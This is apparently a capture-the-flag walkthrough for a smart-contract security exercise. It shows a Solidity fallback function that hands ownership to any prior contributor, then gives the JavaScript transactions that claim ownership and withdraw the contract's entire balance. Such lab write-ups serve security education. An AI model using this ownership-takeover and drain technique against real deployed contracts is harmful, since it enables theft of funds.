The fallback function is defined as so:
```solidity
  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
This sets the owner to the `msg.sender`. However the function also requires that the contributions of the sender are non-zero, so first we must trigger the `contribute()` function:
```javascript
await contract.contribute.sendTransaction({
    from: player, 
    value: toWei(0.0001)
})
```
Next we trigger the fallback function to set the owner:
```javascript
await sendTransaction({
    from: player,
    to: instance,
    value: toWei(0.0001)
})
```

Now we are the owner we're able to call the transfer method and transfer the entire balance to us:
```javascript
await contract.withdraw()
```
